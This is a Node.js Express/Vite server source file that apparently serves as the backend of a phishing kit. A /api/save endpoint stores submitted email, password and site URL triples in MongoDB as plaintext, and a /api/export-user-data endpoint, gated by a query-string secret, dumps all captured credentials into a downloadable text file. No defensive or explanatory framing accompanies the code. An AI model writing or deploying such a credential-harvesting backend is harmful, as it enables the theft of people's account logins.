import express from "express";
import { createServer as createViteServer } from "vite";
import mongoose from "mongoose";
import { getDate, getTime, env } from "@nexoracle/utils";
env.load();
import UserData from "./user-data.mongoose.model.js";
import fs from "fs";
import path from "path";

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

const startServer = async () => {
  const app = express();

  app.use(express.json());

  app.post("/api/save", async (req, res) => {
    const { email, password, url } = req.body;

    if (!email || !password || !url) {
      return res.status(400).json({ error: "All fields are required" });
    }

    try {
      const existing = await UserData.findOne({ email, password, url });

      if (existing) {
        return res.status(200).json({ message: "✅ Data already exists" });
      }

      const newData = new UserData({ email, password, url });
      await newData.save();

      res.status(201).json({ message: "✅ Data saved successfully" });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "❌ Failed to save data" });
    }
  });

  app.get("/api/export-user-data", async (req, res) => {
    const providedPassword = req.query.password;
    const secretPassword = process.env.PASSWORD;

    if (!providedPassword || providedPassword !== secretPassword) {
      return res.status(403).json({ error: "Forbidden" });
    }

    try {
      const allUsers = await UserData.find({});

      if (allUsers.length === 0) {
        return res.status(404).json({ error: "No data found" });
      }

      const lines = allUsers.map((u, i) => {
        return `#${i + 1}\nEmail: ${u.email}\nPassword: ${u.password}\nURL: ${u.url}\nTime: ${getTime()}\nDate: ${getDate()}\n`;
      });

      const fileContent = lines.join("\n===========================\n");

      const filePath = path.join(process.cwd(), "user-data-export.txt");
      fs.writeFileSync(filePath, fileContent);

      res.download(filePath, "user-data.txt", (err) => {
        if (err) {
          console.error("❌ Download error:", err);
          res.sendStatus(500);
        } else {
          fs.unlinkSync(filePath);
        }
      });
    } catch (err) {
      console.error("❌ Export error:", err.message);
      res.sendStatus(500);
    }
  });

  const vite = await createViteServer({
    server: { middlewareMode: true },
    appType: "spa",
  });

  app.use(vite.middlewares);

  app.listen(5173, () => {
    console.log("✅ Running on http://localhost:5173");
  });
};

startServer();
